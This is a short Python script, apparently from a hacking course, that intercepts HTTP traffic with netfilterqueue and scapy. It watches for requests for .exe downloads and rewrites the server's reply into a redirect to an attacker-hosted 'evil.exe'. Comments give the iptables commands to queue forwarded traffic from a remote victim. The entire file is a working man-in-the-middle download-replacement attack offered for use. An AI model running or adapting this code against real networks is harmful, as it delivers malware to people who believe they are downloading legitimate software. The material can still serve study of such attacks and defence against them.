# Targeting a remote computer
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

# Testing on the local computer
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables --flush


import netfilterqueue
import scapy.all as sc

ack_list = []


def set_load(packet, load):
    packet[sc.Raw].load = load
    del packet[sc.IP].len
    del packet[sc.IP].chksum
    del packet[sc.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = sc.IP(packet.get_payload())
    if scapy_packet.haslayer(sc.Raw):
        if scapy_packet[sc.TCP].dport == 80:
            load = scapy_packet[sc.Raw].load
            if bytes('.exe', 'utf-8') in load:
                print(f'[+] exe Request > {load}')
                ack_list.append(scapy_packet[sc.TCP].ack)
        if scapy_packet[sc.TCP].sport == 80:
            if scapy_packet[sc.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[sc.TCP].seq)
                load = scapy_packet[sc.Raw].load
                print(f'[+] Replacing file > {load}')
                # load = 'HTTP/1.1 301 Moved Permanently\r\nLocation: https://download.winzip.com/gl/nkln/winzip24-home.exe\r\n\r\n'

                # service apache2 start
                # service apache2 stop
                # /var/www/html/evil-files/evil.exe
                load = 'HTTP/1.1 301 Moved Permanently\r\nLocation: http://10.0.2.13/evil-files/evil.exe\r\n\r\n'
                load = bytes(load, 'utf-8')
                print(f'[+] Replacing by file > {load}')
                packet.set_payload(bytes(set_load(scapy_packet, load)))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
